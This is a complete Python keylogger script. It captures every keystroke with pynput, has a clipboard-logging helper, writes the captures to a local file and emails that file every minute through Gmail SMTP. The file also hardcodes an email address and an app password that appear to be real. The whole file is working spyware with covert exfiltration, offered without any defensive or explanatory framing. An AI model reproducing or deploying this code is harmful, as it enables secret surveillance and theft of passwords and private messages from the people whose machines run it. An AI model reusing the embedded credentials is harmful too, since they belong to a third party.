from pynput.keyboard import Key, Listener
import logging
import smtplib
import threading
import pyperclip
import time

# Set up logging to log the keystrokes to a file, writing in the same line
logging.basicConfig(filename="log.txt", level=logging.DEBUG, format="%(message)s", filemode="a")

# Set your email and app password
email = "saranpaul2005@gmail.com"
password = "pdwn pbfb fzbq ykuz"

# Set the interval for sending logs via email (in seconds)
log_interval = 60  # Send email every 60 seconds

# Variable to store the current line of typed characters
typed_text = ""

# Function to send an email with the logged keystrokes
def send_email(log_content):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, log_content)
        server.quit()
    except Exception as e:
        print(f"Error sending email: {e}")

# Function to get clipboard content and log it
def log_clipboard():
    clipboard_content = pyperclip.paste()  # Get clipboard content
    if clipboard_content:
        logging.info(f"[Clipboard]: {clipboard_content}")

# Function to handle key press events
def on_press(key):
    global typed_text
    try:
        # If the key is a regular character (alphabets and numbers), append it to typed_text
        if hasattr(key, 'char') and key.char is not None:
            typed_text += key.char
        # Handle number keys on the number row
        elif key == Key.space:
            typed_text += ' '  # For spacebar
        elif key == Key.enter:
            typed_text += ' [Enter] '  # Add a marker for Enter key
        elif key == Key.tab:
            typed_text += ' [Tab] '  # For tab key
        elif key == Key.backspace:
            typed_text += ' [Backspace] '  # For backspace
        elif key == Key.shift:
            typed_text += ' [Shift] '  # For shift key
    except AttributeError:
        pass

# Function to handle the key release event
def on_release(key):
    global typed_text
    if key == Key.esc:
        # Stop listener if the ESC key is pressed
        return False
    # Write the entire typed text in one go when the key is released
    if typed_text:
        logging.info(typed_text)  # Log typed_text without extra parameters
        typed_text = ""  # Reset after logging the line

# Function to periodically send email with logs
def send_periodic_email():
    while True:
        log_content = open("log.txt", "r").read()  # Read the log file
        if log_content:
            send_email(log_content)
        time.sleep(log_interval)

# Start the email sending thread
email_thread = threading.Thread(target=send_periodic_email)
email_thread.daemon = True  # Ensure the thread terminates when the program exits
email_thread.start()

# Start the listener to monitor key events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
